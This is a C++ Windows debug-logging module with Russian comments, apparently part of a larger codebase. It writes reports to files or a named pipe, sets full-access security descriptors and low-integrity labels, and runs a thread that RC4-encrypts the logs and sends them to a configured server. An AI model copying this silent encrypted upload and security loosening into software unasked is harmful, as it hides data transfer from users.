#include <windows.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <sddl.h>
#include <accCtrl.h>

#include "str.h"
#include "fs.h"
#include "sync.h"
#include "winsecurity.h"
#include "debug.h"
#include "process.h"

#if(BO_DEBUG > 0)

#define MUTEX_WRITEFILE L"{8EEEA37C-5CEF-11DD-9810-2A4256D89593}"
#define LOG_FILE        L"debug.txt"
#define LOG_BUFFER_SIZE 2048
#define PIPE_NAME       L"\\\\.\\pipe\\4273890-9343434"
#define PIPE_MUTEX      L"4273890-9343434"

#if(BO_DEBUG == 2)
#  if !defined XLIB_DEBUG_SERVER_URL
#    error XLIB_DEBUG_SERVER_HOST not defined!
#  endif
#  if !defined XLIB_DEBUG_SERVER_CRYPTKEY
#    error XLIB_DEBUG_SERVER_CRYPTKEY not defined!
#  endif
#endif

static SECURITY_ATTRIBUTES saFullAccess;
static SECURITY_DESCRIPTOR sdFullAccess;
static bool SecurityOK;
static WCHAR __strDebugReportFile[MAX_PATH];
#if(BO_DEBUG == 1)
static DWORD integrityLevel;
#endif

#pragma pack(push, 1)
typedef struct
{
  BYTE bDataType;     //Тип отчета.

  DWORD dwLastError;  //Значение GetLastError() на момент вызова.
  DWORD dwPID;        //PID
  DWORD dwTID;        //TID
  DWORD dwTickCount;  //GetTickCount()

  char strFunctionName[50]; //UTF-8. Имя функции, думаю 50 байт будет достаточно.
  char strSourceFile[50];   //UTF-8. Имя исходного файла.
  DWORD dwLineNumber;       //Номер строки в исходном файле.
}DEBUGDATA;
#pragma pack(pop)

//Открытия файла отчетов.
static HANDLE OpenLogFile(void)
{
#if(BO_DEBUG == 1)
  WinSecurity::_setLowIntegrityLevelLabel(__strDebugReportFile, SE_FILE_OBJECT, false);
  HANDLE file = CWA(kernel32, CreateFileW)(__strDebugReportFile, GENERIC_WRITE | WRITE_DAC, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

  //Альтернативный путь
  WCHAR path[MAX_PATH];
  if(file == INVALID_HANDLE_VALUE && (integrityLevel == Process::INTEGRITY_UNKNOWN || integrityLevel == Process::INTEGRITY_HIGH))
  {
    path[0] = 0;
    CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_DESKTOP, NULL, SHGFP_TYPE_CURRENT, path);
    Fs::_pathCombine(path, path, LOG_FILE);
    WinSecurity::_setLowIntegrityLevelLabel(path, SE_FILE_OBJECT, false);
    file = CWA(kernel32, CreateFileW)(path, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  }

  //Пишим BOM
  if(file != INVALID_HANDLE_VALUE)
  {
    LARGE_INTEGER li;
    if(CWA(kernel32, GetFileSizeEx)(file, &li) && li.HighPart == 0 && li.LowPart == 0)
    {
      DWORD dws = UTF8_BOM;
      CWA(kernel32, WriteFile)(file, &dws, UTF8_BOM_SIZE, &li.LowPart, NULL);
    }
  }
#elif(BO_DEBUG == 2)
  HANDLE file = CWA(kernel32, CreateFileW)(__strDebugReportFile, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
#endif
  return file;
}

void DebugClient::Init(void)
{
  SecurityOK = WinSecurity::_getFullAccessDescriptors(&saFullAccess, &sdFullAccess);

#if(BO_DEBUG == 1)
  integrityLevel = Process::_getIntegrityLevel(CURRENT_PROCESS);
  if(integrityLevel == Process::INTEGRITY_UNKNOWN || integrityLevel == Process::INTEGRITY_HIGH)
  {
    Str::_CopyW(__strDebugReportFile, L"C:\\" LOG_FILE, -1);
  }
  else
  {
    __strDebugReportFile[0] = 0;
    CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_DESKTOP, NULL, SHGFP_TYPE_CURRENT, __strDebugReportFile);
    Fs::_pathCombine(__strDebugReportFile, __strDebugReportFile, LOG_FILE);
  }
#elif(BO_DEBUG == 2)
  Str::_CopyW(__strDebugReportFile, PIPE_NAME, -1);
#endif
}

void DebugClient::Uninit(void)
{

}

void DebugClient::WriteString(LPSTR pstrFuncName, LPSTR pstrSourceFile, DWORD dwLineNumber, BYTE bType, LPWSTR pstrFormat, ...)
{
  static const LPSTR WDDType[] = {"INFO", "WARNING", "ERROR"};
  
  DEBUGDATA Data;
  SYSTEMTIME lt;

  //Заполняем структуру.
  Mem::_zero(&Data, sizeof(DEBUGDATA));
  Data.dwLastError   = CWA(kernel32, GetLastError)();
  Data.bDataType     = bType;
  Data.dwPID         = CWA(kernel32, GetCurrentProcessId)();
  Data.dwTID         = CWA(kernel32, GetCurrentThreadId)();
  Data.dwTickCount   = CWA(kernel32, GetTickCount)();
  Data.dwLineNumber  = dwLineNumber;

  CWA(kernel32, GetLocalTime)(&lt);
                          
  //Имя функции.
  DWORD dwSize = pstrFuncName ? Str::_LengthA(pstrFuncName) : 0;
  if(dwSize > 0)
  {
    dwSize++;
    Str::_CopyA(Data.strFunctionName, pstrFuncName, min((sizeof(Data.strFunctionName) / sizeof(char)), dwSize));
  }

  //Исходный файл.
  dwSize = pstrSourceFile ? Str::_LengthA(pstrSourceFile) : 0;
  if(dwSize > 0)
  {
    dwSize++;
    Str::_CopyA(Data.strSourceFile, pstrSourceFile, min((sizeof(Data.strSourceFile) / sizeof(char)), dwSize));
  }

  //Создаем отчет.
  Str::UTF8STRING u8str;
  bool utf8_ok = false;
  {
    LPWSTR pTmpBuffer = (LPWSTR)Mem::alloc(LOG_BUFFER_SIZE * sizeof(WCHAR));

    //Строка по умолчанию.
    #define ERROR_STR "FAILED TO ALLOCATE STRING."
    
    char def_str[sizeof(ERROR_STR)];
    Mem::_copy(def_str, ERROR_STR, sizeof(ERROR_STR) * sizeof(char));
    
    u8str.data   = (void *)def_str;
    u8str.lenght = sizeof(ERROR_STR) - 1;
    u8str.size   = sizeof(ERROR_STR) - 1;
    
    #undef ERROR_STR

    if(pTmpBuffer)
    {
      //Заголовок.
      int iSysSize = Str::_sprintfW(pTmpBuffer, 250,
                                    L"[%02u:%02u:%02u] TC=%010u, PID=%04u(0x%04X), TID=%04u(0x%04X), LE=%u(0x%X), F=%S, FL=%S (%u)\r\n%S: ",
                                    lt.wHour, lt.wMinute, lt.wSecond, Data.dwTickCount, Data.dwPID, Data.dwPID, Data.dwTID, Data.dwTID,
                                    Data.dwLastError, Data.dwLastError,
                                    Data.strFunctionName, Data.strSourceFile, Data.dwLineNumber,
                                    (bType < sizeof(WDDType) / sizeof(LPSTR) ? WDDType[bType] : "-"));

      //Лог.
      if(iSysSize > 0)
      {
        va_list list;
        va_start(list, pstrFormat);
        int iLogSize =  Str::_vsprintfW(pTmpBuffer + iSysSize, LOG_BUFFER_SIZE - iSysSize, pstrFormat, list);
        va_end(list);

        //Конвертируем в UTF-8.
        if(iLogSize > 0)utf8_ok = Str::_utf8FromUnicode(pTmpBuffer, iSysSize + iLogSize, &u8str);
      }

      Mem::free(pTmpBuffer);
    }
  }
  
  HANDLE hMutex = Sync::_waitForMutex(SecurityOK ? &saFullAccess : NULL, MUTEX_WRITEFILE);
  if(hMutex)
  {
    //Запись в файл.
    HANDLE hFile = OpenLogFile();
    if(hFile != INVALID_HANDLE_VALUE)
    {
#if(BO_DEBUG == 1)
      if(CWA(kernel32, SetFilePointer)(hFile, 0, NULL, FILE_END) != INVALID_SET_FILE_POINTER)
      {
        CWA(kernel32, WriteFile)(hFile, u8str.data, u8str.size, &dwSize, 0);
        CWA(kernel32, WriteFile)(hFile, "\r\n\r\n", 4, &dwSize, 0);
      }
#elif(BO_DEBUG == 2)
      DWORD dwTmp = PIPE_READMODE_MESSAGE | PIPE_WAIT;
      CWA(kernel32, SetNamedPipeHandleState)(hFile, &dwTmp, NULL, NULL);
      CWA(kernel32, WriteFile)(hFile, u8str.data, u8str.size, &dwSize, 0);      
#endif
      //CWA(kernel32, FlushFileBuffers)(hFile);
      CWA(kernel32, CloseHandle)(hFile);
    }
    Sync::_freeMutex(hMutex);
  }

  if(utf8_ok)Str::_utf8Free(&u8str);
  CWA(kernel32, SetLastError(Data.dwLastError));
}

#if(BO_DEBUG == 2)
typedef struct
{
  DWORD dwPos;
  LPSTR pText;
  WORD  wTextSize;
}LOGDATA;

static CRITICAL_SECTION csLogs;
static LOGDATA *pLogs;
static DWORD dwLogsCount;

static DWORD WINAPI SentLogsToServer(void *)
{
  for(;;)  
  {
    CWA(kernel32, Sleep)(2000);

    for(;;)
    {
      CWA(kernel32, EnterCriticalSection)(&csLogs);
      
      //Ищим следующий лог.
      DWORD dwMin = (DWORD)-1;
      DWORD dwIndex = (DWORD)-1;
      LOGDATA *pld = NULL;
      
      for(DWORD i = 0; i < dwLogsCount; i++)if(pLogs[i].dwPos > 0 && pLogs[i].dwPos <= dwMin)
      {
        dwMin   = pLogs[i].dwPos;
        dwIndex = i;
      }

      //Отправляем лог.
      if(dwIndex != (DWORD)-1)
      {
        Wininet::CALLURLDATA cud;
        Mem::_zero(&cud, sizeof(Wininet::CALLURLDATA));
        cud.bAutoProxy                 = true;
        cud.bTryCount                  = 2;
        cud.dwRetryDelay               = 1000;
        cud.pstrURL                    = XLIB_DEBUG_SERVER_URL;
        cud.SendRequest_pPostData      = pLogs[dwIndex].pText;
        cud.SendRequest_dwPostDataSize = pLogs[dwIndex].wTextSize;
        cud.SendRequest_dwFlags        = Wininet::WISRF_METHOD_GET;
        CWA(kernel32, LeaveCriticalSection)(&csLogs);

        MEMDATA md;
        if(Wininet::_CallURL(&cud, &md) > 0)
        {
          if(md.dwSize >= 2 && ((LPBYTE)md.pData)[0] == 'O' && ((LPBYTE)md.pData)[1] == 'K')
          {
            CWA(kernel32, EnterCriticalSection)(&csLogs);
            pLogs[dwIndex].dwPos = 0;
            Mem::free(pLogs[dwIndex].pText);
            CWA(kernel32, LeaveCriticalSection)(&csLogs);
          }
          Mem::free(md.pData);
        }
      }
      else
      {
        CWA(kernel32, LeaveCriticalSection)(&csLogs);
        break;
      }
    }
  }
}

void DebugClient::StartLogServer(void)
{
  HANDLE hMutex = Sync::_waitForMutex(SecurityOK ? &saFullAccess : NULL, PIPE_MUTEX);
  if(hMutex)
  {
    CWA(kernel32, InitializeCriticalSection)(&csLogs);
    pLogs       = NULL;
    dwLogsCount = 0;

    //Создаем пайп.
    HANDLE hPipe = CWA(kernel32, CreateNamedPipeW)(__strDebugReportFile, PIPE_ACCESS_INBOUND, PIPE_TYPE_MESSAGE | PIPE_WAIT | PIPE_READMODE_MESSAGE, PIPE_UNLIMITED_INSTANCES, 1024, 1024, NMPWAIT_USE_DEFAULT_WAIT, NULL);
    if(hPipe != INVALID_HANDLE_VALUE)
    {
      //Создаем поток для оправки логов.
      HANDLE hThread = CWA(kernel32, CreateThread)(NULL, 0, SentLogsToServer, NULL, 0, NULL);
      if(hThread)
      {
        CWA(kernel32, CloseHandle)(hThread);
        
        DWORD dwCurLogPos = 1;
        
        //Ждем подключения.
        while(CWA(kernel32, ConnectNamedPipe)(hPipe, NULL) ? 1 : (CWA(kernel32, GetLastError)() == ERROR_PIPE_CONNECTED ? 1 : 0))
        {
          DWORD dwReaded;
          LPSTR pTmpBuffer = (LPSTR)Mem::alloc(LOG_BUFFER_SIZE);
          bool ok = false;

          if(CWA(kernel32, ReadFile)(hPipe, pTmpBuffer, LOG_BUFFER_SIZE - 1, &dwReaded, NULL) && dwReaded > 0)
          {
            Mem::reallocEx(&pTmpBuffer, dwReaded + 1);

            CWA(kernel32, EnterCriticalSection)(&csLogs);
            LOGDATA *pp = NULL;
            for(DWORD i = 0; i < dwLogsCount; i++)if(pLogs[i].dwPos == 0)
            {
              pp = &pLogs[i];
              break;
            }

            if(pp == NULL && Mem::reallocEx(&pLogs, sizeof(LOGDATA) * (dwLogsCount + 1)))pp = &pLogs[dwLogsCount++];

            if(pp)
            {
              pp->dwPos     = dwCurLogPos++;
              pp->pText     = pTmpBuffer;
              pp->wTextSize = dwReaded;
              Crypt::_rc4Full(XLIB_DEBUG_SERVER_CRYPTKEY, sizeof(XLIB_DEBUG_SERVER_CRYPTKEY) - 1, pp->pText, pp->wTextSize);
              ok = true;
            }
            CWA(kernel32, LeaveCriticalSection)(&csLogs);
          }
          if(ok == false)Mem::free(pTmpBuffer);

          //CWA(kernel32, FlushFileBuffers)(hPipe);
          CWA(kernel32, DisconnectNamedPipe)(hPipe);
        }
      }
      CWA(kernel32, CloseHandle)(hPipe);
    }
    
    //CWA(kernel32, DeleteCriticalSection)(&csLogs);
    Sync::_freeMutex(hMutex);
  }
}
#endif

static LONG WINAPI DebugException(struct _EXCEPTION_POINTERS* ExceptionInfo)
{
#if defined _WIN64
  DebugClient::WriteString(".", ".", 0, DebugClient::WDDT_ERROR, L"EXCEPTION: Code=0x%08X\nFlags=0x%08X\nAddress=0x%p\n"
                           L"rax=0x%p, rbx=0x%p, rdx=0x%p, rcx=0x%p, rsi=0x%p, rdi=0x%p, rbp=0x%p, rsp=0x%p, rip=0x%p",
                           ExceptionInfo->ExceptionRecord->ExceptionCode,
                           ExceptionInfo->ExceptionRecord->ExceptionFlags,
                           ExceptionInfo->ExceptionRecord->ExceptionAddress,
                           ExceptionInfo->ContextRecord->Rax,
                           ExceptionInfo->ContextRecord->Rbx,
                           ExceptionInfo->ContextRecord->Rdx,
                           ExceptionInfo->ContextRecord->Rcx,
                           ExceptionInfo->ContextRecord->Rsi,
                           ExceptionInfo->ContextRecord->Rdi,
                           ExceptionInfo->ContextRecord->Rbp,
                           ExceptionInfo->ContextRecord->Rsp,
                           ExceptionInfo->ContextRecord->Rip
                          );

#else
  DebugClient::WriteString(".", ".", 0, DebugClient::WDDT_ERROR, L"EXCEPTION: Code=0x%08X\nFlags=0x%08X\nAddress=0x%p\n"
                           L"eax=0x%p, ebx=0x%p, edx=0x%p, ecx=0x%p, esi=0x%p, edi=0x%p, ebp=0x%p, esp=0x%p, eip=0x%p",
                           ExceptionInfo->ExceptionRecord->ExceptionCode,
                           ExceptionInfo->ExceptionRecord->ExceptionFlags,
                           ExceptionInfo->ExceptionRecord->ExceptionAddress,
                           ExceptionInfo->ContextRecord->Eax,
                           ExceptionInfo->ContextRecord->Ebx,
                           ExceptionInfo->ContextRecord->Edx,
                           ExceptionInfo->ContextRecord->Ecx,
                           ExceptionInfo->ContextRecord->Esi,
                           ExceptionInfo->ContextRecord->Edi,
                           ExceptionInfo->ContextRecord->Ebp,
                           ExceptionInfo->ContextRecord->Esp,
                           ExceptionInfo->ContextRecord->Eip
                          );
#endif
  return EXCEPTION_EXECUTE_HANDLER;
}

void DebugClient::RegisterExceptionFilter(void)
{
  CWA(kernel32, SetUnhandledExceptionFilter)(DebugException);
}
#endif
